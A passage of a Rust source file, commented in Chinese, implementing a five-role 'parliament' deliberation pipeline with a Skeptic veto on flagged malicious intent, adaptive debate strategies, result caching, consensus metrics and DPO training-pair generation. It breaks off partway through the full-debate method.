//! 议会辩论 — 提案 → 辩论 → 投票 → 共识全流程
//!
//! 对应架构层:L8 Parliament
//! 对应创新点:AHIRT(Anti-Hack Intelligent Red Team,反黑客红队)
//!
//! # 设计决策(WHY)
//! - `FuturesUnordered` 并发收集 5 角色 Opinion:流式处理,内存占用低,
//!   首个完成可立即处理(对应 A.2 设计决策,继承 Week 4 GQEP 经验)
//! - 辩论超时 5 秒:对应架构红线"所有异步操作必须有 GQEP 聚集/超时处理",
//!   超时视为拒绝(避免孤儿调用)
//! - Opinion 生成占位实现:基于 Quest 特征的规则化生成,
//!   Week 6 NMC 接入真实模型后替换为模型推理
//! - Skeptic 否决权(Week 5 Task 31):辩论前先检测恶意意图,
//!   若检测到立即返回 Consensus::Vetoed,跳过辩论(< 10ms)
//! - DPO 训练对生成(Week 5 Task 31):共识达成后从赞成/反对 Opinion
//!   中提取 chosen/rejected 对,经 ConsensusReached 事件传递给 AutoDPO
//! - `DebateStarted`/`SkepticVeto`/`CapabilityFrozen` 事件经 EventBus 发布,
//!   供 L9 Quest 与 L4 SecCore 订阅(Week 5 Task 37 已集成)

use std::time::{Duration, Instant};

use event_bus::{EventBus, EventMetadata, NexusEvent};
use futures::stream::{FuturesUnordered, StreamExt};
use nexus_core::{Quest, ThinkingMode};
use tracing::{error, info, warn};
use uuid::Uuid;

use crate::config::ParliamentConfig;
use crate::error::ParliamentError;
// ADR-064:质量趋势分析器 — 滑动窗口跟踪共识质量趋势
use crate::quality_trend::QualityTrendAnalyzer;
// 悖论风险实时监控仪表盘 — 三信号融合风险监控
use crate::paradox_dashboard::ParadoxRiskDashboard;
// P4-W14.3 S5 接缝:ParliamentLearnerHolder 承载 omega-learner 异步下发的策略
use crate::learner_holder::ParliamentLearnerHolder;
use crate::roles::RoleRegistry;
use crate::strategy_cap::{min_strategy, StrategyCapGuard};
use crate::types::{Consensus, DeliberationCache, Opinion, Proposal, ProposalKey, Role};
use crate::veto::{Skeptic, VetoOverrideTicket};
use crate::voting::{
    compute_decision_hash, publish_capability_frozen_event, publish_consensus_event,
    publish_debate_completed_event, publish_debate_started_event, publish_skeptic_veto_event,
    publish_veto_overridden_event, ConsensusQualityMetrics, VoteCounter,
};
// P4-W14.3 S5 接缝:Parliament 激活策略类型(L0 契约,跨层共享)
// WHY L8 → L0 ✓(§2.2 依赖铁律):parliament 仅依赖 L0 类型,不直接依赖 L6 omega-learner
use nexus_contracts::{ActivationStrategy, ParliamentPolicy};

// ============================================================
// 审议投票度量载体(内部)
// ============================================================

/// 审议投票度量载体 — 三路径回传给 `deliberate_with_policy` 的投票与质量数据
///
/// WHY 内部 struct 而非多元组:携带 weighted_approval_rate/participation_rate/
/// 多维质量三组数据,命名字段比 3-tuple 可读;仅供统一发布 DebateCompleted 使用。
/// `Copy`:字段均为 f32 + Copy 的 ConsensusQualityMetrics,零成本传递。
#[derive(Debug, Clone, Copy)]
struct DebateVoteMetrics {
    /// 加权赞成率(共识质量 proxy)
    weighted_approval_rate: f32,
    /// 参与率
    participation_rate: f32,
    /// 多维共识质量(M2-T2.1)
    quality: ConsensusQualityMetrics,
}

impl DebateVoteMetrics {
    /// 从 VoteResult 提取度量载体
    fn from_result(result: &crate::voting::VoteResult) -> Self {
        Self {
            weighted_approval_rate: result.weighted_approval_rate,
            participation_rate: result.participation_rate,
            quality: result.quality,
        }
    }

    /// 投票率元组(供 publish_debate_completed_event 的 vote_rates 参数)
    fn vote_rates(&self) -> (f32, f32) {
        (self.weighted_approval_rate, self.participation_rate)
    }
}

// ============================================================
// DPO 训练对 — 共识达成后生成的偏好优化训练数据
// ============================================================

/// DPO 训练对 — 从辩论中提取的 chosen/rejected Opinion 对
///
/// WHY DPO(Direct Preference Optimization):共识达成时,赞成方与反对方
/// 的 Opinion 形成天然的好/坏决策对比,供 AutoDPO 进行偏好优化训练。
/// 经 ConsensusReached 事件的 `dpo_pair_id` 字段传递(不直接调用 AutoDPO,
/// 避免向上依赖 L5,符合 §2.2 依赖铁律)。
///
/// # 字段
/// - `chosen`:赞成立场(position=1.0)中置信度最高的 Opinion
/// - `rejected`:反对立场(position=0.0)中置信度最高的 Opinion
/// - `context`:quest_id + 决策哈希,供训练时还原决策上下文
#[derive(Debug, Clone, PartialEq)]
pub struct DpoPair {
    /// 训练对唯一 ID(UUIDv7,时间有序便于追溯)
    pub pair_id: String,
    /// 选择的 Opinion(赞成方最高置信度)
    pub chosen: Opinion,
    /// 拒绝的 Opinion(反对方最高置信度)
    pub rejected: Opinion,
    /// 决策上下文(quest_id:decision_hash)
    pub context: String,
    /// 关联的 Quest ID
    pub quest_id: String,
}

/// DPO 训练对生成器 — 从辩论 Opinion 中提取 chosen/rejected 对
///
/// WHY 无状态结构:DPO 对生成是纯函数操作,无需维护状态,
/// `DpoPairGenerator` 仅作为方法载体,线程安全(Send + Sync)。
///
/// # 生成规则
/// 1. 仅当 Consensus::Reached 时生成(无共识无对比价值)
/// 2. `chosen` = 赞成立场(position=1.0)中置信度最高的 Opinion
/// 3. `rejected` = 反对立场(position=0.0)中置信度最高的 Opinion
/// 4. 若无反对意见,返回 None(无对比,不生成)
pub struct DpoPairGenerator;

impl DpoPairGenerator {
    /// 创建新的 DPO 训练对生成器
    pub fn new() -> Self {
        Self
    }

    /// 从辩论 Opinion 与共识结果生成 DPO 训练对
    ///
    /// # 参数
    /// - `quest_id`:关联的 Quest ID
    /// - `opinions`:辩论产生的所有 Opinion
    /// - `consensus`:共识判定结果
    ///
    /// # 返回
    /// - `Some(DpoPair)`:存在赞成/反对对比,生成训练对
    /// - `None`:共识未达成,或无反对意见(无对比价值)
    pub fn generate(
        &self,
        quest_id: &str,
        opinions: &[Opinion],
        consensus: &Consensus,
    ) -> Option<DpoPair> {
        // 仅当共识达成时生成
        let decision_hash = match consensus {
            Consensus::Reached { decision_hash, .. } => decision_hash.as_str(),
            _ => return None,
        };

        // chosen = 赞成立场(position=1.0)中置信度最高的 Opinion
        let chosen = opinions.iter().filter(|o| o.is_approve()).max_by(|a, b| {
            a.confidence
                .partial_cmp(&b.confidence)
                .unwrap_or(std::cmp::Ordering::Equal)
        })?;

        // rejected = 反对立场(position=0.0)中置信度最高的 Opinion
        let rejected = opinions.iter().filter(|o| o.is_reject()).max_by(|a, b| {
            a.confidence
                .partial_cmp(&b.confidence)
                .unwrap_or(std::cmp::Ordering::Equal)
        })?;

        // 若无反对意见,返回 None(无对比价值)
        // (rejected 的 ? 已处理 None 情况)

        let pair_id = Uuid::now_v7().to_string();
        let context = format!("{quest_id}:{decision_hash}");

        Some(DpoPair {
            pair_id,
            chosen: chosen.clone(),
            rejected: rejected.clone(),
            context,
            quest_id: quest_id.to_string(),
        })
    }
}

impl Default for DpoPairGenerator {
    fn default() -> Self {
        Self::new()
    }
}

// ============================================================
// 议会 — 5 角色对抗性审议核心
// ============================================================

/// 议会 — 5 角色对抗性审议与决策治理核心
///
/// 维护角色注册表,接收 Quest 与 Proposal,并发收集 5 角色 Opinion,
/// 加权投票并判定共识,发布事件通知订阅者。
///
/// # 线程安全
/// `Parliament` 内部所有字段均为线程安全(`RoleRegistry` 基于 `RwLock`,
/// `EventBus` 基于 `Arc`,`VoteCounter` 为无状态,`Skeptic` 持有不可变规则库,
/// `DpoPairGenerator` 为无状态)。`deliberate` 为 `&self`,
/// 保证多次审议调用共享同一注册表与事件总线。
pub struct Parliament {
    /// 议会配置(权重、阈值、超时)
    config: ParliamentConfig,
    /// 角色注册表(5 角色画像)
    registry: RoleRegistry,
    /// 事件总线(跨层通信唯一通道)
    event_bus: EventBus,
    /// 投票计数器(无状态,持有配置引用)
    vote_counter: VoteCounter,
    /// Skeptic 否决者(恶意意图检测,辩论前行使否决权)
    skeptic: Skeptic,
    /// DPO 训练对生成器(共识达成后生成 chosen/rejected 对)
    dpo_generator: DpoPairGenerator,
    /// P4-W14.3 S5 接缝:Parliament 激活策略学习器持有器
    ///
    /// 承载 `omega-learner` 异步下发的 `ParliamentPolicy`,为
    /// `deliberate_with_policy` 提供策略感知能力。C4 合规:
    /// 默认 `Static(Full)` = 既有行为,无策略注入时行为与 P4 修复前一致。
    learner_holder: ParliamentLearnerHolder,
    /// 策略封顶守卫(推理悖论红线风控,ratio 反馈驱动的审议深度上限)
    ///
    /// WHY Arc:订阅器(`spawn_strategy_cap_subscriber`)需与 Parliament
    /// 共享同一守卫实例,上层编排器通过 `strategy_cap()` 访问器
    /// Arc::clone 后启动后台订阅任务。与 LinUCB 互补:封顶仅做 min 上界,
    /// 学习器输出不被改写。
    strategy_cap: std::sync::Arc<StrategyCapGuard>,
    /// 悖论风险实时监控仪表盘(Mutex 保护,不跨 .await 持锁)
    ///
    /// 监测三信号(ratio/否决异常率/共识健康分)融合,
    /// 单信号超标→Yellow 预警降档,两信号超标→Red 熔断。
    /// 与 StrategyCapGuard 互补:仪表盘是上层指挥官,Guard 是执行者。
    /// 毒锁降级:使用 `unwrap_or_else(|e| e.into_inner())` 恢复(§4.1 约定)。
    paradox_dashboard: std::sync::Mutex<ParadoxRiskDashboard>,
    /// 审议结果缓存(Mutex 保护,不跨 .await 持锁)
    ///
    /// 缓存相同 Quest+Proposal 的审议结果,避免重复审议。
    /// 使用 Mutex 而非 RwLock:读写比例均衡(一次查+一次写),Mutex 更轻量。
    /// 毒锁降级:使用 `unwrap_or_else(|e| e.into_inner())` 恢复(§4.1 约定)。
    deliberation_cache: std::sync::Mutex<DeliberationCache>,
    /// ADR-064:质量趋势分析器 — 滑动窗口跟踪共识质量趋势
    ///
    /// 在每次审议完成后推送 ConsensusQualityMetrics 到分析器，
    /// 通过滑动窗口 + 连续计数检测分歧异常/弃权趋势。
    /// Mutex 保护：同步访问，不跨 .await 持锁(§4.1 约定)。
    /// 毒锁降级:使用 `unwrap_or_else(|e| e.into_inner())` 恢复。
    quality_trend: std::sync::Mutex<QualityTrendAnalyzer>,
}

impl Parliament {
    /// 创建新的议会实例
    ///
    /// # 参数
    /// - `config`:议会配置(权重、阈值、超时)
    /// - `event_bus`:事件总线,用于发布 `ConsensusReached`/`VoteCast` 事件
    pub fn new(config: ParliamentConfig, event_bus: EventBus) -> Self {
        let registry = RoleRegistry::new(&config);
        let vote_counter = VoteCounter::new(&config);
        // 封顶守卫使用配置中的滞后带参数(初始封顶 Full = 不设限)
        let strategy_cap = std::sync::Arc::new(StrategyCapGuard::new(config.strategy_cap.clone()));
        // 克隆 event_bus 和 strategy_cap 供悖论仪表盘使用：
        // - event_bus 用于发布预警事件(EfficiencyAlertTriggered)
        // - strategy_cap 用于紧急降档/熔断/恢复(绕过滞后带)
        // 克隆在 Self 块之前完成，避免 move 后所有权丢失(E0382)。
        let paradox_bus = event_bus.clone();
        let paradox_cap = std::sync::Arc::clone(&strategy_cap);
        Self {
            config,
            registry,
            event_bus,
            vote_counter,
            skeptic: Skeptic::default(),
            dpo_generator: DpoPairGenerator::new(),
            learner_holder: ParliamentLearnerHolder::new(),
            strategy_cap,
            paradox_dashboard: std::sync::Mutex::new(ParadoxRiskDashboard::new(
                Some(paradox_bus),
                Some(paradox_cap),
            )),
            deliberation_cache: std::sync::Mutex::new(DeliberationCache::new(None)),
            quality_trend: std::sync::Mutex::new(QualityTrendAnalyzer::new(None)),
        }
    }

    /// 获取策略封顶守卫引用(推理悖论红线风控)
    ///
    /// 上层编排器(chimera-cli / quest-engine)通过此访问器 `Arc::clone`
    /// 后调用 `spawn_strategy_cap_subscriber` 启动 ratio 反馈订阅任务;
    /// 测试可直接调用 `observe()` 驱动状态机。
    pub fn strategy_cap(&self) -> &std::sync::Arc<StrategyCapGuard> {
        &self.strategy_cap
    }

    /// P4-W14.3 S5 接缝:获取 Parliament 学习器持有器引用
    ///
    /// 上层编排器(chimera-cli / quest-engine)通过此访问器获取
    /// `&ParliamentLearnerHolder`,调用 `update_policy()` 异步下发
    /// `omega-learner` 学习到的策略,或调用 `fallback_to_static()` 触发熔断。
    ///
    /// # 设计(WHY 引用而非 owned)
    ///
    /// 返回引用保证:
    /// - 调用方无法 `take` holder,避免 Parliament 内部状态失效
    /// - `ParliamentLearnerHolder` 内部 `RwLock` 支持并发读写,引用足够
    /// - 与 ` skeptic()` / `vote_counter()` 等访问器模式一致
    pub fn learner_holder(&self) -> &ParliamentLearnerHolder {
        &self.learner_holder
    }

    /// 审议提案:提案 → 辩论 → 投票 → 共识
    ///
    /// P4-W14.3 S5 接缝重构:此方法现为薄包装,委托给 `deliberate_with_policy`,
    /// 使用 `ParliamentLearnerHolder` 当前激活的 `ParliamentPolicy`。
    ///
    /// 默认行为(C4 合规):`ParliamentLearnerHolder::new()` 初始化为
    /// `ParliamentPolicy::Static(ActivationStrategy::Full)`,与 P4 修复前
    /// 完全一致(5 角色完整辩论 + Skeptic 否决)。
    ///
    /// # 流程
    /// 1. 从 `learner_holder` 读取当前 `ParliamentPolicy`
    /// 2. 委托给 `deliberate_with_policy` 执行策略感知审议
    ///
    /// # 参数
    /// - `quest`:关联的 Quest(提供任务数、思考模式等特征)
    /// - `proposal`:待审议的提案
    ///
    /// # 返回
    /// 共识判定结果,或辩论超时错误
    pub async fn deliberate(
        &self,
        quest: &Quest,
        proposal: &Proposal,
    ) -> Result<Consensus, ParliamentError> {
        // 读取当前策略快照(Copy 枚举,~10ns,无锁竞争)
        let policy = self.learner_holder.current_policy();
        self.deliberate_with_policy(quest, proposal, &policy).await
    }

    /// P4-W14.3 S5 接缝:策略感知审议提案
    ///
    /// 根据 `ParliamentPolicy` 携带的 `ActivationStrategy` 分派三路径:
    /// - `FastPath`:跳过 Opinion 生成,仅做 Skeptic 否决检查后直接返回共识
    /// - `Simplified`:仅 Architect + Skeptic + Optimizer 三关键角色辩论
    /// - `Full`:5 角色完整辩论(既有行为,向后兼容)
    ///
    /// # 三重悖论"推理悖论"修复(WHY 策略感知)
    ///
    /// 10 层架构跨层协调成本存在阈值。Parliament 辩论是典型的
    /// "协调成本 vs 推理增益"权衡:S5 接缝通过 LinUCB 学习上下文 →
    /// 策略映射,使辩论强度随场景自适应:
    /// - 低风险 + 只读 + 历史推翻率低 → `FastPath`(协调成本 < 推理增益)
    /// - 中等风险或不确定 → `Simplified`(三关键角色即可决策)
    /// - 高风险 + 写操作 + 历史推翻率高 → `Full`(全面审议必要)
    ///
    /// # 安全保证(三策略共同)
    ///
    /// **Skeptic 否决检查始终执行**(红队防线不可绕过):
    /// - 即使 `FastPath` 跳过 Opinion 生成,仍先做 Skeptic 检测
    /// - WHY:恶意意图检测是安全机制,不能因策略优化而绕过
    /// - 触发否决时返回 `Consensus::Vetoed`,与 `Full` 行为一致
    ///
    /// # C4 合规(能力场灰度)
    ///
    /// - `policy = Static(Full)`(默认):行为与 P4 修复前 `deliberate()` 完全一致
    /// - `policy = Learned(...)`:使用 omega-learner 下发的策略,行为由学习驱动
    /// - 任何异常(panic/超时)由调用方 fallback 到 `Static(Full)` 后再调用
    ///
    /// # 流程
    /// 0. Skeptic 恶意意图检测(三策略共同前置)
    /// 1. 按 `policy.strategy()` 分派:
    ///    - `FastPath`:发布 DebateStarted(0 参与者)→ 直接生成共识 → 发布 ConsensusReached
    ///    - `Simplified`:发布 DebateStarted(3 参与者)→ 收集 3 角色 Opinion → 投票 → 共识
    ///    - `Full`:发布 DebateStarted(5 参与者)→ 收集 5 角色 Opinion → 投票 → 共识
    /// 2. 若共识达成,生成 DPO 训练对(仅 Simplified/Full 有 Opinion 可提取)
    /// 3. 若共识达成,发布 ConsensusReached 事件 [Critical]
    ///
    /// # 参数
    /// - `quest`:关联的 Quest
    /// - `proposal`:待审议的提案
    /// - `policy`:Parliament 激活策略(承载 `ActivationStrategy`)
    ///
    /// # 返回
    /// 共识判定结果,或辩论超时错误(仅 Simplified/Full 路径)
    pub async fn deliberate_with_policy(
        &self,
        quest: &Quest,
        proposal: &Proposal,
        policy: &ParliamentPolicy,
    ) -> Result<Consensus, ParliamentError> {
        // 协调度量接线闭环:审议端到端 wall-clock 计时起点。
        // 口径覆盖 Skeptic 检测 + Opinion 收集 + 投票 + 事件发布串行 await,
        // 审议结束时随 DebateCompleted 事件上报(parliament_debate_latency_ms 数据源)。
        let debate_start = Instant::now();
        // 推理悖论红线风控:策略与封顶取 min(FastPath < Simplified < Full)。
        // 封顶由 StrategyCapGuard 消费 CoordinationRatioReported 反馈维护,
        // 仅做上界不改写学习器输出;Skeptic 检测(下方步骤 0)不受封顶影响。
        let strategy = self.strategy_cap.apply(policy.strategy());

        // 自适应策略选择(当配置启用时)
        // 计算实时 ratio = debate_latency_ms / max(1, opinions_count)
        // 注意:此处仅在首次调用时使用默认 ratio,实际 ratio 在辩论完成后更新
        // StrategyCapGuard::observe 会在后续报告周期中处理
        let selector = crate::adaptive_strategy::AdaptiveStrategySelector::new(None);
        let system_load = crate::adaptive_strategy::SystemLoadProbe::probe();
        let suggested_strategy = selector.select(
            proposal.risk_level,
            0.0, // 首次 ratio 未知,使用 0.0(不触发降级)
            system_load,
            50, // 默认健康分 50(不触发提升)
            strategy,
        );
        // 最终策略 = min(自适应建议, 封顶)
        let effective_strategy = min_strategy(
            suggested_strategy,
            self.strategy_cap.apply(policy.strategy()),
        );

        // ============================================================
        // 步骤 0(前置):审议结果缓存查询
        // ============================================================
        // WHY 在 Skeptic 检测之前:缓存键包含 proposal_id/strategy/risk_level_bucket,
        // 若相同提案+策略+风险桶已审议过,直接返回缓存结果,避免重复编排。
        // 毒锁降级:使用 unwrap_or_else(|e| e.into_inner()) 恢复(§4.1 约定)。
        let cache_key = ProposalKey {
            proposal_id: proposal.proposal_id.clone(),
            strategy: effective_strategy.short_name().to_string(),
            risk_level_bucket: (proposal.risk_level * 20.0) as u32,
        };
        {
            let mut cache = self
                .deliberation_cache
                .lock()
                .unwrap_or_else(|e| e.into_inner());
            if let Some(cached) = cache.get(&cache_key) {
                return Ok(cached.clone());
            }
        }

        // ============================================================
        // 步骤 0:Skeptic 恶意意图检测(三策略共同前置,红队防线)
        // ============================================================
        // WHY 始终执行:恶意意图检测是安全机制,即使 FastPath 也不能绕过。
        // 若检测到恶意模式,立即返回 Vetoed 并发布 SkepticVeto/CapabilityFrozen
        // 事件,跳过后续所有审议流程(无论策略如何)。
        if let Some((veto_reason, frozen_capabilities)) =
            self.skeptic.exercise_veto(&quest.quest_id, proposal)
        {
            let veto_reason_str = format!(
                "Skeptic 否决:{:?} 检测到恶意模式 '{}'({:?})— {}",
                veto_reason.intent_type,
                veto_reason.matched_pattern,
                veto_reason.severity,
                veto_reason.detail
            );

            error!(
                quest_id = %quest.quest_id,
                proposal_id = %proposal.proposal_id,
                intent_type = %veto_reason.intent_type,
                matched_pattern = %veto_reason.matched_pattern,
                severity = ?veto_reason.severity,
                "Skeptic 否决 (SkepticVeto) — 检测到恶意意图"
            );

            // 发布 SkepticVeto 事件 [Critical]
            publish_skeptic_veto_event(
                &self.event_bus,
                &quest.quest_id,
                &veto_reason_str,
                &frozen_capabilities,
            )
            .await;

            // 发布 CapabilityFrozen 事件(每个冻结能力一条)
            for cap in &frozen_capabilities {
                warn!(
                    capability_id = %cap,
                    quest_id = %quest.quest_id,
                    reason = %veto_reason.detail,
                    "能力冻结 (CapabilityFrozen)"
                );
                publish_capability_frozen_event(&self.event_bus, cap, &veto_reason.detail).await;
            }

            // 否决短路路径也上报审议延迟(无投票,vote_rates 与 quality 均为 None)
            publish_debate_completed_event(
                &self.event_bus,
                &quest.quest_id,
                &proposal.proposal_id,
                debate_start.elapsed().as_secs_f64() * 1000.0,
                strategy.short_name(),
                None,
                None,
                "Vetoed",
            )
            .await;

            let veto_consensus = Consensus::Vetoed {
                veto_reason: veto_reason_str,
                frozen_capabilities,
            };
            // 缓存否决结果,避免相同提案再次走 Skeptic 检测
            {
                let mut cache = self
                    .deliberation_cache
                    .lock()
                    .unwrap_or_else(|e| e.into_inner());
                cache.insert(cache_key, veto_consensus.clone());
            }
            return Ok(veto_consensus);
        }

        // ============================================================
        // 步骤 1:按策略分派(三路径互斥)
        // ============================================================
        // 各路径额外返回度量载体(FastPath 无投票为 None),供下方统一
        // 发布 DebateCompleted 时携带投票率与多维共识质量。
        let (consensus, metrics) = match effective_strategy {
            ActivationStrategy::FastPath => self.deliberate_fastpath(quest, proposal).await?,
            ActivationStrategy::Simplified => self.deliberate_simplified(quest, proposal).await?,
            ActivationStrategy::Full => self.deliberate_full(quest, proposal).await?,
        };

        // ============================================================
        // 步骤 2:发布 DebateCompleted 观测事件(协调度量接线闭环 + M2 多维质量)
        // ============================================================
        publish_debate_completed_event(
            &self.event_bus,
            &quest.quest_id,
            &proposal.proposal_id,
            debate_start.elapsed().as_secs_f64() * 1000.0,
            effective_strategy.short_name(),
            metrics.as_ref().map(DebateVoteMetrics::vote_rates),
            metrics.as_ref().map(|m| &m.quality),
            consensus_outcome_label(&consensus),
        )
        .await;

        // ============================================================
        // ADR-064:推送质量指标到趋势分析器(共识判定完成后,缓存写入之前)
        // ============================================================
        // WHY 在缓存写入之前:避免缓存命中时跳过趋势分析,确保每次实际
        // 审议都参与趋势统计。FastPath 路径 metrics=None,不推送。
        // 毒锁降级:使用 unwrap_or_else(|e| e.into_inner()) 恢复(§4.1 约定)。
        if let Some(ref m) = metrics {
            let mut trend = self.quality_trend.lock().unwrap_or_else(|e| e.into_inner());
            trend.push(m.quality);
        }

        // ============================================================
        // 步骤 3:缓存审议结果,避免相同提案+策略重复编排
        // ============================================================
        {
            let mut cache = self
                .deliberation_cache
                .lock()
                .unwrap_or_else(|e| e.into_inner());
            cache.insert(cache_key, consensus.clone());
        }

        // ============================================================
        // 悖论风险仪表盘:三信号融合更新(ADR-063/064 推理悖论红线监控)
        // ============================================================
        // WHY 在缓存写入之后:避免缓存命中路径跳过仪表盘更新,但缓存写入是
        // 轻量 Vec 操作(~5µs),仪表盘更新(~2µs)顺序无关紧要。
        //
        // 三信号提取:
        // - ratio: 审议 wall-clock 耗时(秒),作为协调成本/inference_gain proxy
        //   (花费 5 秒审议 → ratio=5,远超阈值 1.5)
        // - veto_anomaly_rate: 否决时 1.0(最大异常),否则从 quality 的
        //   skeptic_stance 推导(skeptic 立场越接近 0.0,否决倾向越高)
        // - health_score: 质量趋势分析器的综合健康评分(0-100,<40 为异常)
        {
            let ratio = debate_start.elapsed().as_secs_f64();

            let veto_anomaly_rate = if matches!(consensus, Consensus::Vetoed { .. }) {
                1.0f32
            } else {
                // skeptic_stance ∈ [0,1],接近 0 = 反对倾向高
                // 1.0 - skeptic_stance 转换:反对倾向高 → veto_anomaly 高
                metrics.as_ref().map_or(0.0f32, |m| {
                    (1.0f32 - m.quality.skeptic_stance).clamp(0.0, 1.0)
                })
            };

            let health_score = {
                let trend = self.quality_trend.lock().unwrap_or_else(|e| e.into_inner());
                trend.consensus_health_score()
            };

            let mut dashboard = self
                .paradox_dashboard
                .lock()
                .unwrap_or_else(|e| e.into_inner());
            dashboard.update(ratio, veto_anomaly_rate, health_score);
        }

        Ok(consensus)
    }

    /// FastPath 路径 — 跳过 Opinion 生成,直接返回共识
    ///
    /// # 流程
    /// 1. 发布 `DebateStarted` 事件(participant_count=0,审计用)
    /// 2. 生成决议哈希(空 Opinion 列表,仅哈希提案字段)
    /// 3. 发布 `ConsensusReached` 事件 [Critical]
    /// 4. 返回 `Consensus::Reached`(无 DPO 训练对,因无 Opinion 可提取)
    ///
    /// # WHY 跳过 VoteCast
    /// FastPath 无角色投票,不发布 VoteCast 事件。审计通过
    /// DebateStarted + ConsensusReached 两个事件即可还原决策路径。
    ///
    /// # WHY 仍生成 decision_hash
    /// 决议哈希用于 GSOE 进化追踪与审计去重,即使无 Opinion 也需生成。
    /// `compute_decision_hash(proposal, &[])` 仅哈希提案字段。
    ///
    /// # 返回
    /// `(共识, None)` — FastPath 无投票,投票率恒为 `None`
    /// (DebateCompleted 事件的 weighted_approval_rate 随之为 None)。
    async fn deliberate_fastpath(
        &self,
        quest: &Quest,
        proposal: &Proposal,
    ) -> Result<(Consensus, Option<DebateVoteMetrics>), ParliamentError> {
        // 发布 DebateStarted 事件(participant_count=0,标记 FastPath)
        info!(
            quest_id = %quest.quest_id,
            proposal_id = %proposal.proposal_id,
            strategy = "FastPath",
            "辩论开始 (DebateStarted, FastPath — 0 参与者)"
        );
        publish_debate_started_event(
            &self.event_bus,
            &quest.quest_id,
            &proposal.proposal_id,
            0, // FastPath 无参与者
        )
        .await;

        // 生成决议哈希(空 Opinion 列表)
        let decision_hash = compute_decision_hash(proposal, &[]);

        // 构造共识(FastPath 直接达成,无 DPO 训练对)
        let consensus = Consensus::Reached {
            decision_hash: decision_hash.clone(),
            dpo_pair_id: None, // FastPath 无 Opinion,DPO 生成器无法提取 chosen/rejected
        };

        // 发布 ConsensusReached 事件 [Critical]
        publish_consensus_event(&self.event_bus, &proposal.quest_id, &decision_hash, None).await;

        Ok((consensus, None))
    }

    /// Simplified 路径 — 仅 Architect + Skeptic + Optimizer 三关键角色辩论
    ///
    /// # 流程
    /// 1. 发布 `DebateStarted` 事件(participant_count=3)
    /// 2. 并发收集 3 关键角色 Opinion(Architect/Skeptic/Optimizer)
    /// 3. 发布 VoteCast 事件(3 个角色)
    /// 4. 共识判定(使用 `count_votes`,total_roles=3)
    /// 5. 若共识达成,生成 DPO 训练对
    /// 6. 若共识达成,发布 ConsensusReached 事件 [Critical]
    ///
    /// # WHY 仅 3 关键角色
    /// - **Architect**:架构合理性(系统设计维度)
    /// - **Skeptic**:红队风险审查(安全维度,含否决权)
    /// - **Optimizer**:性能与资源效率(执行维度)
    /// - 跳过 Librarian(知识检索)与 Bard(创意发散):中等风险场景下
    ///   这两个维度的推理增益小于协调成本
    ///
    /// # 返回
    /// `(共识, Some((加权赞成率, 参与率)))` — 投票率取自 `VoteResult`,
    /// 供 DebateCompleted 事件携带(共识质量 proxy,协调度量接线闭环)。
    async fn deliberate_simplified(
        &self,
        quest: &Quest,
        proposal: &Proposal,
    ) -> Result<(Consensus, Option<DebateVoteMetrics>), ParliamentError> {
        // 简化辩论的 3 个关键角色
        const SIMPLIFIED_ROLES: [Role; 3] = [Role::Architect, Role::Skeptic, Role::Optimizer];

        // 发布 DebateStarted 事件(participant_count=3)
        info!(
            quest_id = %quest.quest_id,
            proposal_id = %proposal.proposal_id,
            strategy = "Simplified",
            "辩论开始 (DebateStarted, Simplified — 3 参与者)"
        );
        publish_debate_started_event(
            &self.event_bus,
            &quest.quest_id,
            &proposal.proposal_id,
            SIMPLIFIED_ROLES.len() as u8,
        )
        .await;

        // 并发收集 3 关键角色 Opinion
        let opinions = self
            .collect_opinions_filtered(quest, proposal, &SIMPLIFIED_ROLES)
            .await?;

        // 发布 VoteCast 事件(3 个角色)
        self.publish_vote_events(proposal, &opinions).await;

        // 共识判定(total_roles=3,参与率 = 3/3 = 1.0)
        let total_roles = SIMPLIFIED_ROLES.len();
        let result = self
            .vote_counter
            .count_votes(&opinions, total_roles, proposal);
        // 保留投票率(协调度量接线闭环:此前被丢弃,现随事件上报)
        // M2-T2.2:从 VoteResult 提取度量载体(投票率 + 多维质量),随 DebateCompleted 上报
        let metrics = DebateVoteMetrics::from_result(&result);

        // DPO 训练对生成(3 角色 Opinion 仍可提取 chosen/rejected)
        let mut consensus = result.consensus;
        if let Consensus::Reached { decision_hash, .. } = &consensus {
            let dpo_pair_id = self
                .dpo_generator
                .generate(&proposal.quest_id, &opinions, &consensus)
                .map(|p| p.pair_id);
            consensus = Consensus::Reached {
                decision_hash: decision_hash.clone(),
                dpo_pair_id,
            };
        }

        // 发布 ConsensusReached 事件 [Critical]
        if let Consensus::Reached {
            decision_hash,
            dpo_pair_id,
        } = &consensus
        {
            publish_consensus_event(
                &self.event_bus,
                &proposal.quest_id,
                decision_hash,
                dpo_pair_id.as_deref(),
            )
            .await;
        }

        Ok((consensus, Some(metrics)))
    }

    /// Full 路径 — 5 角色完整辩论(既有行为,向后兼容)
    ///
    /// # 流程
    /// 1. 发布 `DebateStarted` 事件(participant_count=5)
    /// 2. 并发收集 5 角色 Opinion(Architect/Skeptic/Optimizer/Librarian/Bard)
    /// 3. 发布 VoteCast 事件(5 个角色)
    /// 4. 共识判定(使用 `count_votes`,total_roles=5)
    /// 5. 若共识达成,生成 DPO 训练对
    /// 6. 若共识达成,发布 ConsensusReached 事件 [Critical]
    ///
    /// # WHY 保留为独立方法
    /// 将 Full 路径从 `deliberate_with_policy` 主体抽离,使三策略
    /// (FastPath/Simplified/Full)各自独立方法,便于单测与未来扩展。
    ///
    /// # 返回
    /// `(共识, Some((加权赞成率, 参与率)))` — 语义同 `deliberate_simplified`。
    async fn deliberate_full(
        &self,
        quest: &Quest,
        proposal: &Proposal,
    ) -> Result<(Consensus, Option<DebateVoteMetrics>), ParliamentError> {
        // 发布 DebateStarted 事件(5 参与者)
        info!(
            quest_id = %quest.quest_id,
            proposal_id = %proposal.proposal_id,
            strategy = "Full",
            "辩论开始 (DebateStarted, Full — 5 参与者)"
        );
        publish_debate_started_event(
            &self.event_bus,
            &quest.quest_id,
            &proposal.proposal_id,
            self.registry.count() as u8,
        )
        .await;

        // 5 角色并行辩论,并发收集 Opinion
        let opinions = self.collect_opinions(quest, proposal).await?;

        // 发布 VoteCast 事件(5 个角色)
        self.publish_vote_events(proposal, &opinions).await;

        // 共识判定
        let total_roles = self.registry.count();
        let result = self
            .vote_counter
            .count_votes(&opinions, total_roles, proposal);
        // 保留投票率(协调度量接线闭环:此前被丢弃,现随事件上报)
        // M2-T2.2:从 VoteResult 提取度量载体(投票率 + 多维质量),随 DebateCompleted 上报
        let metrics = DebateVoteMetrics::from_result(&result);

        // DPO 训练对生成
        let mut consensus = result.consensus;
        if let Consensus::Reached { decision_hash, .. } = &consensus {
            let dpo_pair_id = self
                .dpo_generator
